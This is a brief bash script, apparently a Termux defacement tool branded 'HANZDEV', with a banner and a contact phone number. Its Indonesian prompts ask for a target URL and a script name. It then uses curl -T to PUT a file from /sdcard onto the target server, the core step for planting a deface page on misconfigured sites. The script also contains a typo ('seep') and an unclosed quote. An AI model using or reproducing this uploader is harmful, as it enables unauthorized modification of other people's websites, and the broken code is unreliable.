clear
figlet '    HANZDEV' | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By hanz dev       ]=====>" | lolcat
echo  "    <=====[  Concact Me : +6283175817046  ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
read -p "Masukan Target =>" target;
read -p "Masukan Nama Scriptnya =>" script;
sleep 1
echo "Proses.."
curl -T /sdcard/$script $target
seep 1
echo ' [*] => Selesai 
sleep 2